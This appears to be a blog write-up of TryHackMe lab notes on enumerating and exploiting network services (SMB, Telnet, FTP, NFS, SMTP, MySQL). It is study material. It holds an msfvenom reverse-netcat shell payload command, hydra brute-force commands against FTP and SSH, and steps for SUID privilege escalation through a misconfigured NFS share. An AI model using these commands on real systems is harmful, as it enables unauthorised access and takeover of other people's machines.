---
date: '2024-09-14T22:24:25+05:30'
draft: false
title: 'Network Enumeration'
slug: network-enumeration.thm
category: writeups
showtoc: true
tags: ["tryhackme", "enumeration"]
summary: This is all about various network services, their enumeration and their exploitation.
description: This is all about various network services, their enumeration and their exploitation.
---

# SMB - Server Message Block

## Understanding

- SMB stands for server message block.
- It is a client-server communication protocol user for sharing access to files, printers, ports and other resources of the network.
- It is a request-response protocol
- Samba is an open-source server.
- Clients connect to the SMB server using TCP/IP protocol.
- SMB runs on port 139/445

## Enumerating

- Port Scanning
    - First thing to do in enumeration is port scanning.
    - Scan ports using nmap tool
- Enum4Linux
    - It is used for enumerating SMB shares.
    - Cross-compatibility
    - It comes default in parrot and Kali and can also be cloned from [github](https://github.com/portcullislabs/enum4linux)
    - Coming to syntax : enum4linux [options] ip
    - Flags and functions are as follows:
        - -U   —>   get user list
        - -G   —>   get group and member list
        - -P   —>   get password policy information
        - -M   —>   get machine list
        - -S   —>   get share list
        - -N   —>   get namelist dump
        - -A   —>   all of the above information

## Exploiting

- SMBClient
    - In order to access smb shares we need one client called smbclient
    - Access shares : smbclient //ip/share-name
    - smbclient //IP//share-name
        - -U   —>   to specify user
        - -p   —>   to specify port
    - We can download entire smb share using smbget
        
        smbget -R smb://ip/anonymous
        
    - To connect to a share : smbclient \\\\ip\\share-name
-------
# Telnet

## Understanding

- It is an application protocol it serves on port 23
- It uses clear text for communication
- telnet is the client and the syntax is : telnet ip port

## Enumerating

- Port Scanning
    
    Find for open ports using nmap
    

## Exploiting

- Connecting to telnet
    
    telnet ip port
    
- Payload
    
    If telnet server accepts commands then generate a payload with msfvenom and get the reverse shell.
    
    msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R ( This gives raw payload output )
    
- tcpdump
    
    If necessary start tcpdump to monitor packets and syntax is sudo tcpdump <ip> proto \\<packet-type> -i <interface>
    
    Ex, sudo tcpdump ip proto \\icmp -i eth0
-------

# FTP - File Transfer Protocol

## Understanding

- FTP is a protocol used for sharing files over a network
- It is a client-server model
- It runs default on port 21
- There are 2 modes of FTP connections
    - Active   —>   We(client) listens on a port and server connects to our listening port.
    - Passive   —>   Server listens on a port we(client) connect to that listening port.
- FTP communication is not encrypted.

## Enumerating

- Connect
    
    ftp ip
    
    Check for anonymous login and connect accordingly. Finally, enumerate the listable files.
    

## Exploiting

- Check for the files and get them.
    
    
- If needed crack passwords using hydra
    
    hydra -t 4 -l <known-username> -P /path/of/wordlist ip <protocol> -vV
    
    -t 4 specifies parallel connections for bruteforcing
-----

# NFS - Network File system

## Understanding

- It allows to share directories and files over a network.
- File sharing is done through mounting.
- This mounting uses RPC daemon for file transfer.
- It checks for required user permissions for mounting.
- It takes 3 parameters :
    - file handle
    - name of the file to be accessed
    - user ID, group ID

## Enumerating

- nfs-common
    - nfs-common share needs to be installed for further enumeration because it consists of various programs such as **lockd, statd, showmount, nfsstat, gssd, idmapd and mount.nfs**
    - It can be installed if it is not using the command sudo apt install nfs-common
- Port Scanning
    
    Scan the machine for open ports, services using nmap
    
- Mounting NFS shares
    - create one directory to mount ( remote files / directories of the share will be shown in this created directory )
    - sudo mount -t nfs <ip>:share /tmp/mount/ -nolock
        
        -t nfs   —>   type of device to mount
        
        -nolock   —>   Specifies not to use NLM locking
        
    - /usr/sbin/showmount -e <IP>   —>   to list the NFS shares
    

## Exploiting

- root_squash
    - By default, root squashing is enabled and it prevents anyone connecting to the NFS share from having root access to the NFS volume.
    - It has a user called "nfsnobody" which has low privileges.
    - If root_squash is disabled then we can create SUID bit files and escalate privileges as root user.
- SUID
    
    The file(s) which can run with the permission of file owner/group that means as super-user are called as SUID files. It will be helpful for escalating privileges.
    
- How to exploit
    
    Upload file to the NFS share by controlling the permissions of files
    
    Change the created group to user : sudo chown root <executable-bash>
    
    Add SUID permission and make it executable ny adding +x : sudo chmod +S <executable-bash>
------------

# SMTP - Simple Mail Transfer Protocol

## Understanding

- It stands for simple Mail Transfer Protocol and runs on port 25
- SMTP server functions are :
    - It verifies who is sending mails through SMTP server
    - It sends outgoing mails
    - If outgoing mail is not delivered then it sends message back to the sender
- POP and IMAP
    - POP stands for Post Office Protocol
    - IMAP stands for Internet Message Access Protocol
    - These both are responsible for transfer of emails between client and server
- First, sender sends mail through SMTP server
- Then, SMTP server performs SMTP handshake
- If the mail is deliverable then it sends to receiver's POP/IMAP server. Else, to the SMTP queue.

## Enumerating

- Server Details
    - smtp_version : metasploit module used for enumerating version
    - Find smtp version either through metasploit or kali'ssmtp-user-enum [script](https://github.com/pentestmonkey/smtp-user-enum) or using hydra
- Users
    - smtp_enum : metasploit module used for enumerating users
    - It has two commands for enumerating users :
        - **VRFY**   —>   Confirming name of valid users
        - **EXPN**   —>   It reveals user's aliases and mailing lists
- Syntax
    - smtp-user-enum
        
        $ smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t $ip
        
        smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.110.155 -w 60
        
    - hydra
        
        hydra smtp-enum://ip/vrfy -L /usr/share/seclists/Usernames/Names/malenames-usa-top1000-lower.txt
        

## Exploiting

- Hydra
    - If ssh is open then bruteforce the password using hydra because we have username from enumerating section.
    - Syntax,hydra -t 16 -l <username> -P /path/to/wordlist <ip> ssh -vV
    - -t 16   —>   number of parallel connections for bruteforcing
--------

# MySQL

## Understanding

- MySQL is a relational database management system ( RDBMS ) based on Structured Query Language ( SQL ) it runs on port 3306
- RDBMS is a software / service used for creating and manipulatng relational ( tables ) model
- Client-server communication protocol

## Enumerating

- Basic information
    
    It will come handy if we have basic information like usernames and all so that we could bruteforce to find the credentials.
    
- Credentials
    
    Let's say we have credentials "**root:password**"
    
- MySQL client
    
    Make sure you have MySQL client installed
    
    sudo apt install default-mysql-client
    
- Metasploit and Manual
    
    For manual enumeration : 
    
    - nmap's mysql-enum [script](https://nmap.org/nsedoc/scripts/mysql-enum.html)
    - [https://www.exploit-db.com/exploits/23081](https://www.exploit-db.com/exploits/23081)
- Login
    ```bash
    mysql -h <ip> -u <username> -p
    ```
    
- Execute queries
    
    Execute SQL queries for databases, version information
    

## Exploiting

- `mysql_schemadump`
    
    Metasploit module for dumping schemas
